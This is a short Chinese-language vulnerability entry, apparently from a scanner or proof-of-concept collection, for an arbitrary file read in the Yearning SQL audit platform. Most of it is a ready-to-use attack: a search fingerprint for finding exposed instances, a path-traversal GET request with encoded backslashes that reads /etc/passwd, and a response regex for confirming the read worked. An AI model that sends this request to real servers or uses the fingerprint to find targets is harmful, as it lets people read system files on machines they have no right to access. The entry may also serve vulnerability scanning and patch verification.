# Yearningfront任意文件读取漏洞

Yearningfront ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="Yearning"`
- **请求**：`GET /front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$